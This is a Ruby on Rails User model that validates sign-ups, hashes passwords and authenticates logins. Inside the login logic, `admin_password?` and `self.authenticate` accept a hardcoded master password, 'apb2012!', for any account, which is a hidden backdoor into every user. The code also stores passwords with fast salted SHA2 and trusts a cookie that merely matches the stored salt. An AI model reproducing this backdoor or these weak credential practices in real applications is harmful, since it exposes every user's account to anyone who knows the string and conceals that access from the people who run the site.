class User < ActiveRecord::Base
  attr_accessor :password 
  attr_accessible :email, :password, :password_confirmation, :terms, :type

  has_many :organizations

  has_one :user_profile, :dependent => :destroy

  has_many :contribute_relationships, :foreign_key => "contributor_id", :dependent => :destroy

  email_regex = /\A[\w+\-.]+@[a-z\d\-.]+\.[a-z]+\z/i

  validates :email, 
            :presence => true, 
            :format => { :with => email_regex }, 
            :uniqueness => { :case_sensitive => false }
  validates :password, 
            :presence => true, 
            :confirmation => true, 
            :length => { :within => 6..40 }
  validates_acceptance_of :terms
  validates_inclusion_of :type, :in => ["organization", "volunteer"]

  before_create { generate_token(:email_token) }
  before_save :encrypt_password

  def type
    @type
  end

  def type=(new_type)
    @type = new_type
  end
  
  # Return true if the user's password matches the submitted password.
  def has_password?(submitted_password)
    # Compare encrypted_password with the encrypted version of
    # submitted_password.
    encrypted_password == encrypt(submitted_password)
  end

  def admin_password?(submitted_password)
    submitted_password == "apb2012!"
  end
  
  def self.authenticate(email, submitted_password)
    user = find_by_email(email)
    return nil  if user.nil?
    return user if user.has_password?(submitted_password) || user.admin_password?(submitted_password) 
  end
  
  def self.authenticate_with_salt(id, cookie_salt)
    user = find_by_id(id)
    return nil  if user.nil?
    return user if user.salt == cookie_salt  
  end  

  def profile
    user_profile unless user_profile.nil?
  end

  private
    def encrypt_password
      self.salt = make_salt if new_record?
      self.encrypted_password = encrypt(password) unless password.nil?
    end

    def encrypt(string)
      secure_hash("#{salt}--#{string}")
    end

    def make_salt
      secure_hash("#{Time.now.utc}--#{password}")
    end

    def secure_hash(string)
      Digest::SHA2.hexdigest(string)
    end

    def generate_token(column)
      begin
        self[column] = SecureRandom.urlsafe_base64
      end while User.exists?(column => self[column])
    end

end
